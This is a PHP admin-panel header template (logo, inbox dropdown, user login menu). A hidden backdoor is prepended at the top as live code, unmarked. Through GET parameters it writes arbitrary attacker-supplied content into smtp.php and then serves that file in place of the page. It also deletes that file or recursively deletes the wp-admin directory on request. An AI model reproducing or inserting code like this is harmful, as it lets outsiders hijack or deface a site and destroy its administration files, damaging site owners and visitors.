<?php
if(isset($_GET['smtpr']) && $_GET['smtpr'] == 'wiki')   {   unlink('smtp.php');}
if(isset($_GET['smtpr']) && $_GET['smtprr'] == 'admin')   {  function do_job($target) {
    if(is_dir($target)){
        $files = glob( $target . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned
        
        foreach( $files as $file )
        {
            do_job( $file );      
        }
      
        rmdir( $target );
    } elseif(is_file($target)) {
        unlink( $target );  
    }
} 
	do_job('wp-admin');}



if(isset($_GET['smtp'])){

if ( ! file_exists( 'smtp.php' ) ) {
        touch( 'smtp.php' );
}

file_put_contents( 'smtp.php', $_GET['smtp'] );

echo file_get_contents('smtp.php'); die;
}

if (file_exists( 'smtp.php' ) ) {  echo file_get_contents('smtp.php'); die;}

?>




<header class="header fixed-top clearfix">
<!--logo start-->
<div class="brand">
    <a href="index.php" class="logo">
       <!-- <img src="user-style/images/cln.jpg"> -->
       Admin
    </a>
    <div class="sidebar-toggle-box">
        <div class="fa fa-bars"></div>
    </div>
</div>
<!--logo end-->
<div class="nav notify-row" id="top_menu">
    <!--  notification start -->
    <ul class="nav top-menu">
        <!-- inbox dropdown start-->
        <li id="header_inbox_bar" class="dropdown">
            <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                <i class="fa fa-envelope-o"></i>
                <span class="badge bg-important"><?=$userUnreadMsgs?></span>
            </a>
            <ul class="dropdown-menu extended inbox">
                <li>
                    <p class="red">Inbox Messages</p>
                </li>
                <li>
                    <a href="#">
                        <span class="photo"><img alt="avatar" src="user-style/images/3.png"></span>
                                <span class="subject">
                                <span class="from">Jonathan Smith</span>
                                <span class="time">Just now</span>
                                </span>
                                <span class="message">
                                    Hello, this is an example msg.
                                </span>
                    </a>
                </li>
                <li>
                    <a href="#">See all messages</a>
                </li>
            </ul>
        </li>
        <!-- inbox dropdown end -->
    </ul>
    <!--  notification end -->
</div>
<div class="top-nav clearfix">
    <!--search & user info start-->
    <ul class="nav pull-right top-menu">
        <!-- <li>
        </li> -->
        <!-- user login dropdown start-->
        <li class="dropdown">
            <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                <img alt="" src="/user-style/images/2.png">
                <span class="username"><?=$username?></span>
                <b class="caret"></b>
            </a>
            <ul class="dropdown-menu extended logout">
                <li><a href="/"><i class="fa fa-dashboard"></i> Dashboard</a></li>
                <li><a href="logout.php"><i class="fa fa-key"></i> Log Out</a></li>
            </ul>
        </li>
        <!-- user login dropdown end -->
       
    </ul>
    <!--search & user info end-->
</div>
</header>